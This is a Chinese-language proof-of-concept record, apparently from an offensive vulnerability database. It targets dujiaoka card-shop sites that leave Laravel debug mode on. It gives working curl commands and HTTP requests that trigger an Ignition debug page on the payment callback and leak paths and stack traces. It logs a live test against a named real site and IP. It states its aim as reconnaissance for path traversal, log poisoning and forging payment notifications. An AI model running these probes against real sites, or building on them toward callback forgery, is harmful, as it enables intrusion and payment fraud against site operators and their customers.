# dujiaoka 开启 APP_DEBUG → Laravel Ignition 调试页泄露绝对路径与堆栈（/pay/vpay/notify_url 缺参触发）

- **code**: dujiaoka-vpay-notify-ignition-debug-leak
- **kind**: poc
- **category**: info-leak
- **component**: dujiaoka（独角数卡，Laravel + Ignition）
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-06 05:48 GMT 在 https://yunkaapp.shop（资产 103.214.140.152）用 Windows curl.exe -k 直连实测：GET /pay/vpay/notify_url 返回 HTTP 200 完整 Laravel Ignition 页面，HTML 注释含 `ErrorException: Undefined index: param in file /www/wwwroot/yunkaapp.shop/app/Http/Controllers/Pay/VpayController.php on line 55` 及 PayGateWay.php(19)/vendor 完整调用栈；URL 补 payId/param/type/price/reallyPrice/sign 后响应回归 4 字节 `fail`，证明调试页仅在参数缺失时触发、端点本身存活。产物落盘 D:\ARTEX\data\tasks\616\i10524\b_yipay.txt 与 v1.html。
- **path**: pocs/dujiaoka-vpay-notify-ignition-debug-leak/dujiaoka_vpay_ignition_debug_leak.http
- **tags**: dujiaoka,laravel,ignition,app_debug,info-leak,path-disclosure,stack-trace,vpay,notify_url
- **created_at**: 2026-11-05T21:57:23.762Z
- **engine**: yunkaapp.shop（103.214.140.152）
- **found_by**: vuln-scan

## 描述

dujiaoka（PHP/Laravel 发卡站）默认部署常保留 APP_DEBUG=true，任意会抛异常的接口都会渲染 Laravel Ignition 完整调试页。VpayController.php:55 直接取 $request['param'] 未做 isset，对 /pay/vpay/notify_url 裸 GET 即触发 Undefined index，回显站点绝对路径、源码行号与完整中间件/vendor 调用栈。用途：确证框架与本体、拿 docroot 绝对路径（供 LFI/路径穿越/日志投毒定位）、确认支付回调端点存活以便后续伪造回调。

## 用法

```
前提：目标为 dujiaoka（PHP Laravel），APP_DEBUG 未关（官方 deploy 文档默认如此）；无需 Cookie/凭据。
1) 指纹与验证：直接裸打支付回调
   curl -sk --noproxy '*' "https://TARGET/pay/vpay/notify_url"
2) 判据：HTTP 200 且 text/html，页面含 window.Ignition / window.ignite 与 HTML 注释里的
   `ErrorException: Undefined index: param in file /www/wwwroot/<...>/app/Http/Controllers/Pay/VpayController.php on line 55`
   以及 PayGateWay.php 中间件栈 → 成立。
3) 确认端点存活可用作伪造靶：补齐参数后应回归业务逻辑
   curl -sk "https://TARGET/pay/vpay/notify_url?payId=1&param=<order_sn>&type=1&price=0.00&reallyPrice=0.00&sign=abc"
   → 正文为 `fail`（验签不通过），说明只是参数缺失才触发调试页。
4) 其它可试抛异常入口：/pay/*/notify_url（各支付插件）、/pay/epusdt/... 等带数组下标取值的回调；商品页带非法 id 亦可。
失败常见原因：APP_DEBUG=false（返回 Laravel 通用 500 或空白）；站点非 dujiaoka/Laravel 路由（404/宝塔默认页）；前置 CDN 把 5xx 换页缓存（加时间戳重试）；回调路由被 PayGateWay 先行拦截（换用确实会取 param 的 entry）。
```

## 正文

```
# dujiaoka APP_DEBUG 开启 → Ignition 调试页信息泄露

## 1. 触发（无凭证，裸 GET）
GET /pay/vpay/notify_url HTTP/1.1
Host: TARGET
User-Agent: curl/8.x

## 2. 典型回显（节选）
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>...
<script>window.Ignition = window.ignite(window.data)</script>
<!--
ErrorException: Undefined index: param in file
  /www/wwwroot/<site>/app/Http/Controllers/Pay/VpayController.php on line 55
#0 .../VpayController.php(55)
...
#7 .../app/Http/Middleware/PayGateWay.php(19)
-->

## 3. 存活确认（补齐参数走验签分支）
GET /pay/vpay/notify_url?payId=1&param=<order_sn>&type=1&price=0.00&reallyPrice=0.00&sign=abc HTTP/1.1
Host: TARGET

→ HTTP/1.1 200 OK
→ fail

## 4. 利用价值
- 泄露 docroot 绝对路径（本例 /www/wwwroot/<site>/），可喂给 LFI / 路径穿越 / 日志投毒定位；
- 泄露确切文件与行号（VpayController.php:55），确认应用为 dujiaoka 且未关 debug；
- 泄露中间件链（PayGateWay.php），辅助判断回调是否经过支付网关校验；
- 端点存活 ⇒ 可作为后续伪造异步通知（对齐 order_sn / price / sign 算法）的落点。

## 5. 复现命令
curl -sk --noproxy '*' "https://TARGET/pay/vpay/notify_url"
curl -sk --noproxy '*' "https://TARGET/pay/vpay/notify_url?payId=1&param=TEST202601010001&type=1&price=0.00&reallyPrice=0.00&sign=abc"

## 6. 注意
- 返回完整 HTML 调试页属泄露；若返回 500 空白页，多为 APP_DEBUG=false；
- 站点根路径与站点名因部署而异，以回显为准，勿直接套用。
```
